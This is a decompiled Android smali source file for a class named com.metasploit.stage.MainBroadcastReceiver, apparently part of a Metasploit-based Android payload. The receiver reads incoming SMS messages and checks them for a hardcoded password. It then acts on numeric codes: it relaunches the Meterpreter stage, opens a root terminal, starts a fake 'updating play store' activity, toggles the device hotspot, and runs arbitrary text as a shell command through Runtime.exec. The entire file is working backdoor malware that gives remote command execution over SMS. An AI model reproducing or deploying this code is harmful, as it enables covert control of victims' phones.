.class public Lcom/metasploit/stage/MainBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MainBroadcastReceiver.java"


# static fields
.field public static final SMS_BUNDLE:Ljava/lang/String; = "pdus"


# instance fields
.field check:Ljava/lang/String;

.field command:Ljava/lang/String;

.field hotspotoff:Ljava/lang/String;

.field hotspoton:Ljava/lang/String;

.field hotspotonnull:Ljava/lang/String;

.field meterpreter:Ljava/lang/String;

.field passwd:Ljava/lang/String;

.field terminal:Ljava/lang/String;

.field update:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 20
    const-string/jumbo v0, "goo.gl.ltRmUp"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->passwd:Ljava/lang/String;

    .line 21
    const-string/jumbo v0, "+1428345601"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->check:Ljava/lang/String;

    .line 22
    const-string/jumbo v0, "+1428345602"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->meterpreter:Ljava/lang/String;

    .line 23
    const-string/jumbo v0, "+1428345603"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->terminal:Ljava/lang/String;

    .line 24
    const-string/jumbo v0, "+1428345604"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->command:Ljava/lang/String;

    .line 25
    const-string/jumbo v0, "+1428345605"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->update:Ljava/lang/String;

    .line 26
    const-string/jumbo v0, "+1428345606"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->hotspoton:Ljava/lang/String;

    .line 27
    const-string/jumbo v0, "+1428345607"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->hotspotonnull:Ljava/lang/String;

    .line 28
    const-string/jumbo v0, "+1428345608"

    iput-object v0, p0, Lcom/metasploit/stage/MainBroadcastReceiver;->hotspotoff:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 29
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 40
    new-instance v10, Landroid/content/Intent;

    invoke-direct {v10}, Landroid/content/Intent;-><init>()V

    .line 41
    .local v10, "i":Landroid/content/Intent;
    const-string/jumbo v25, "com.metasploit.stage"

    const-string/jumbo v26, "com.metasploit.stage.MainActivity"

    move-object/from16 v0, v25

    move-object/from16 v1, v26

    invoke-virtual {v10, v0, v1}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 42
    const/high16 v25, 0x10000000

    move/from16 v0, v25

    invoke-virtual {v10, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 43
    move-object/from16 v0, p1

    invoke-virtual {v0, v10}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 45
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v12

    .line 46
    .local v12, "intentExtras":Landroid/os/Bundle;
    if-eqz v12, :cond_3

    .line 48
    const-string/jumbo v25, "pdus"

    move-object/from16 v0, v25

    invoke-virtual {v12, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v25

    check-cast v25, [Ljava/lang/Object;

    move-object/from16 v19, v25

    check-cast v19, [Ljava/lang/Object;

    .line 49
    .local v19, "sms":[Ljava/lang/Object;
    const-string/jumbo v22, ""

    .line 50
    .local v22, "smsMessageStr":Ljava/lang/String;
    const/4 v11, 0x0

    .local v11, "ii":I
    :goto_0
    move-object/from16 v0, v19

    array-length v0, v0

    move/from16 v25, v0

    move/from16 v0, v25

    if-ge v11, v0, :cond_0

    .line 51
    aget-object v25, v19, v11

    check-cast v25, [B

    check-cast v25, [B

    invoke-static/range {v25 .. v25}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v21

    .line 53
    .local v21, "smsMessage":Landroid/telephony/SmsMessage;
    invoke-virtual/range {v21 .. v21}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v20

    .line 54
    .local v20, "smsBody":Ljava/lang/String;
    invoke-virtual/range {v21 .. v21}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v3

    .line 56
    .local v3, "address":Ljava/lang/String;
    new-instance v25, Ljava/lang/StringBuilder;

    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, v25

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    const-string/jumbo v26, "SMS From: "

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    move-object/from16 v0, v25

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    const-string/jumbo v26, "\n"

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    .line 57
    new-instance v25, Ljava/lang/StringBuilder;

    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, v25

    move-object/from16 v1, v22

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    move-object/from16 v0, v25

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    const-string/jumbo v26, "\n"

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v22

    .line 50
    add-int/lit8 v11, v11, 0x1

    goto :goto_0

    .line 61
    .end local v3    # "address":Ljava/lang/String;
    .end local v20    # "smsBody":Ljava/lang/String;
    .end local v21    # "smsMessage":Landroid/telephony/SmsMessage;
    :cond_0
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->passwd:Ljava/lang/String;

    move-object/from16 v25, v0

    move-object/from16 v0, v22

    move-object/from16 v1, v25

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_3

    .line 64
    const-string/jumbo v25, " "

    move-object/from16 v0, v22

    move-object/from16 v1, v25

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    .line 65
    .local v4, "arr":[Ljava/lang/String;
    const/16 v24, 0x0

    .local v24, "x":I
    const/4 v6, 0x0

    .line 66
    .local v6, "cmd":I
    array-length v0, v4

    move/from16 v26, v0

    const/16 v25, 0x0

    :goto_1
    move/from16 v0, v25

    move/from16 v1, v26

    if-ge v0, v1, :cond_2

    aget-object v23, v4, v25

    .line 68
    .local v23, "ss":Ljava/lang/String;
    aget-object v27, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->passwd:Ljava/lang/String;

    move-object/from16 v28, v0

    invoke-virtual/range {v27 .. v28}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v27

    if-eqz v27, :cond_1

    .line 69
    move/from16 v6, v24

    .line 66
    :goto_2
    add-int/lit8 v25, v25, 0x1

    goto :goto_1

    .line 71
    :cond_1
    add-int/lit8 v24, v24, 0x1

    goto :goto_2

    .line 74
    .end local v23    # "ss":Ljava/lang/String;
    :cond_2
    add-int/lit8 v24, v6, 0x1

    .line 75
    aget-object v25, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->meterpreter:Ljava/lang/String;

    move-object/from16 v26, v0

    invoke-virtual/range {v25 .. v26}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_4

    .line 78
    const-string/jumbo v25, "msf"

    const/16 v26, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v25

    move/from16 v2, v26

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    .line 81
    const-string/jumbo v25, "com.metasploit.stage"

    const-string/jumbo v26, "com.metasploit.stage.MainActivity"

    move-object/from16 v0, v25

    move-object/from16 v1, v26

    invoke-virtual {v10, v0, v1}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 82
    const/high16 v25, 0x10000000

    move/from16 v0, v25

    invoke-virtual {v10, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 83
    move-object/from16 v0, p1

    invoke-virtual {v0, v10}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 166
    .end local v4    # "arr":[Ljava/lang/String;
    .end local v6    # "cmd":I
    .end local v11    # "ii":I
    .end local v19    # "sms":[Ljava/lang/Object;
    .end local v22    # "smsMessageStr":Ljava/lang/String;
    .end local v24    # "x":I
    :cond_3
    :goto_3
    return-void

    .line 85
    .restart local v4    # "arr":[Ljava/lang/String;
    .restart local v6    # "cmd":I
    .restart local v11    # "ii":I
    .restart local v19    # "sms":[Ljava/lang/Object;
    .restart local v22    # "smsMessageStr":Ljava/lang/String;
    .restart local v24    # "x":I
    :cond_4
    aget-object v25, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->check:Ljava/lang/String;

    move-object/from16 v26, v0

    invoke-virtual/range {v25 .. v26}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_5

    .line 87
    const-string/jumbo v25, "checking..."

    const/16 v26, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v25

    move/from16 v2, v26

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    goto :goto_3

    .line 89
    :cond_5
    aget-object v25, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->terminal:Ljava/lang/String;

    move-object/from16 v26, v0

    invoke-virtual/range {v25 .. v26}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_6

    .line 91
    const-string/jumbo v25, "starting terminal"

    const/16 v26, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v25

    move/from16 v2, v26

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    .line 93
    const-string/jumbo v25, "com.example.root.service"

    const-string/jumbo v26, "com.example.root.service.Terminal"

    move-object/from16 v0, v25

    move-object/from16 v1, v26

    invoke-virtual {v10, v0, v1}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 94
    const/high16 v25, 0x10000000

    move/from16 v0, v25

    invoke-virtual {v10, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 95
    move-object/from16 v0, p1

    invoke-virtual {v0, v10}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_3

    .line 97
    :cond_6
    aget-object v25, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->update:Ljava/lang/String;

    move-object/from16 v26, v0

    invoke-virtual/range {v25 .. v26}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_7

    .line 99
    const-string/jumbo v25, "updating play store"

    const/16 v26, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v25

    move/from16 v2, v26

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    .line 101
    const-string/jumbo v25, "com.metasploit.stage"

    const-string/jumbo v26, "com.metasploit.stage.Update"

    move-object/from16 v0, v25

    move-object/from16 v1, v26

    invoke-virtual {v10, v0, v1}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 102
    const/high16 v25, 0x10000000

    move/from16 v0, v25

    invoke-virtual {v10, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 103
    move-object/from16 v0, p1

    invoke-virtual {v0, v10}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_3

    .line 105
    :cond_7
    aget-object v25, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->hotspoton:Ljava/lang/String;

    move-object/from16 v26, v0

    invoke-virtual/range {v25 .. v26}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_8

    .line 107
    const-string/jumbo v25, "starting hspt"

    const/16 v26, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v25

    move/from16 v2, v26

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    .line 109
    invoke-static/range {p1 .. p1}, Lcom/metasploit/stage/Hotspot;->isApOn(Landroid/content/Context;)Z

    move-result v25

    if-nez v25, :cond_3

    .line 110
    invoke-static/range {p1 .. p1}, Lcom/metasploit/stage/Hotspot;->configApState(Landroid/content/Context;)Z

    goto/16 :goto_3

    .line 113
    :cond_8
    aget-object v25, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->hotspotonnull:Ljava/lang/String;

    move-object/from16 v26, v0

    invoke-virtual/range {v25 .. v26}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_9

    .line 115
    const-string/jumbo v25, "starting hspt"

    const/16 v26, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v25

    move/from16 v2, v26

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    .line 117
    invoke-static/range {p1 .. p1}, Lcom/metasploit/stage/Hotspot;->isApOn(Landroid/content/Context;)Z

    move-result v25

    if-nez v25, :cond_3

    .line 118
    invoke-static/range {p1 .. p1}, Lcom/metasploit/stage/Hotspot;->configApState1(Landroid/content/Context;)Z

    goto/16 :goto_3

    .line 121
    :cond_9
    aget-object v25, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->hotspotoff:Ljava/lang/String;

    move-object/from16 v26, v0

    invoke-virtual/range {v25 .. v26}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_a

    .line 123
    const-string/jumbo v25, "hspt of"

    const/16 v26, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v25

    move/from16 v2, v26

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    .line 125
    invoke-static/range {p1 .. p1}, Lcom/metasploit/stage/Hotspot;->isApOn(Landroid/content/Context;)Z

    move-result v25

    if-eqz v25, :cond_3

    .line 126
    invoke-static/range {p1 .. p1}, Lcom/metasploit/stage/Hotspot;->configApState(Landroid/content/Context;)Z

    goto/16 :goto_3

    .line 129
    :cond_a
    aget-object v25, v4, v24

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/metasploit/stage/MainBroadcastReceiver;->command:Ljava/lang/String;

    move-object/from16 v26, v0

    invoke-virtual/range {v25 .. v26}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v25

    if-eqz v25, :cond_3

    .line 131
    add-int/lit8 v25, v24, 0x1

    array-length v0, v4

    move/from16 v26, v0

    move/from16 v0, v25

    move/from16 v1, v26

    invoke-static {v4, v0, v1}, Ljava/util/Arrays;->copyOfRange([Ljava/lang/Object;II)[Ljava/lang/Object;

    move-result-object v9

    check-cast v9, [Ljava/lang/String;

    .line 132
    .local v9, "exa":[Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 133
    .local v5, "builder":Ljava/lang/StringBuilder;
    array-length v0, v9

    move/from16 v26, v0

    const/16 v25, 0x0

    :goto_4
    move/from16 v0, v25

    move/from16 v1, v26

    if-ge v0, v1, :cond_b

    aget-object v18, v9, v25

    .line 135
    .local v18, "s":Ljava/lang/String;
    move-object/from16 v0, v18

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 136
    const-string/jumbo v27, " "

    move-object/from16 v0, v27

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 133
    add-int/lit8 v25, v25, 0x1

    goto :goto_4

    .line 139
    .end local v18    # "s":Ljava/lang/String;
    :cond_b
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 141
    .local v8, "ex":Ljava/lang/String;
    new-instance v25, Ljava/lang/StringBuilder;

    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuilder;-><init>()V

    const-string/jumbo v26, "executing "

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    move-object/from16 v0, v25

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v25

    const/16 v26, 0x1

    move-object/from16 v0, p1

    move-object/from16 v1, v25

    move/from16 v2, v26

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    .line 145
    new-instance v14, Ljava/lang/StringBuffer;

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    .line 149
    .local v14, "output":Ljava/lang/StringBuffer;
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v25

    move-object/from16 v0, v25

    invoke-virtual {v0, v8}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v15

    .line 151
    .local v15, "p":Ljava/lang/Process;
    new-instance v16, Ljava/io/BufferedReader;

    new-instance v25, Ljava/io/InputStreamReader;

    invoke-virtual {v15}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v26

    invoke-direct/range {v25 .. v26}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    move-object/from16 v0, v16

    move-object/from16 v1, v25

    invoke-direct {v0, v1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 153
    .local v16, "reader":Ljava/io/BufferedReader;
    const-string/jumbo v13, ""

    .line 154
    .local v13, "line":Ljava/lang/String;
    :goto_5
    invoke-virtual/range {v16 .. v16}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v13

    if-eqz v13, :cond_c

    .line 155
    new-instance v25, Ljava/lang/StringBuilder;

    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, v25

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    const-string/jumbo v26, "n"

    invoke-virtual/range {v25 .. v26}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v25

    move-object/from16 v0, v25

    invoke-virtual {v14, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_5

    .line 158
    .end local v13    # "line":Ljava/lang/String;
    .end local v15    # "p":Ljava/lang/Process;
    .end local v16    # "reader":Ljava/io/BufferedReader;
    :catch_0
    move-exception v7

    .line 159
    .local v7, "e":Ljava/lang/Exception;
    invoke-virtual {v7}, Ljava/lang/Exception;->printStackTrace()V

    .line 161
    .end local v7    # "e":Ljava/lang/Exception;
    :cond_c
    invoke-virtual {v14}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v17

    .line 162
    .local v17, "response":Ljava/lang/String;
    const/16 v25, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move/from16 v2, v25

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v25

    invoke-virtual/range {v25 .. v25}, Landroid/widget/Toast;->show()V

    goto/16 :goto_3
.end method
